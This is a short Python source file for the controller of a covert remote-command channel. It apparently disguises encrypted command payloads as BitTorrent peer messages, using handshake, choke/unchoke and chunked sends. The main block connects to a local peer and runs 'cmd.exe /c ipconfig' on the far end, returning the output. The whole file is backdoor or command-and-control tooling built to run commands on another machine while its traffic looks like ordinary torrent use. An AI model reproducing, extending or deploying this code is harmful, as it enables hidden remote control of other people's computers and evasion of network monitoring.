from client import TortunClient
import hashlib
from razor.payload import RunCommand
from razor.encryptor import AESCipher


class RazorClient(TortunClient):

    def __init__(self, info_hash, enc_key):
        super(RazorClient, self).__init__(info_hash)
        self.enc_key = enc_key
        self.enc = None

    def initiate_session(self):
        self.bitfield_handshake()
        self.enc = AESCipher(self.enc_key, self.nonce)

    def _reject_last_request(self):
        msg = self.read_message()
        self.reject_request(msg)

    def _wait_for_unchoke(self):
        msg = self.read_message()

    def send_buffer(self, buf):
        self.unchoke()
        buf = self.enc.encrypt(buf)
        chunk_count = int((len(buf) / self.block_size)) + 1
        for i in range(chunk_count):
            self.send_sequence(buf[i * self.block_size:(i + 1) * self.block_size])
        self.choke()

    def read_buffer(self):
        buf = self.receive_output(self.enc)
        return buf

    def exec(self, executable, params=""):
        p = RunCommand(executable, params).to_razor_payload()
        self.send_buffer(p)
        self._wait_for_unchoke()
        self._reject_last_request()
        cmd_out = self.read_buffer()
        return cmd_out.decode('utf-8')


if __name__ == '__main__':
    h = hashlib.sha1()
    h.update(b"tomer")
    h = hashlib.sha256()
    h.update(b"key")
    r = RazorClient(h.digest(), enc_key=h.digest())
    r.connect(("127.0.0.1", 6888))
    r.initiate_session()
    h1 = hashlib.sha256()
    h1.update(b"key")
    print(r.exec("cmd.exe", "/c ipconfig"))
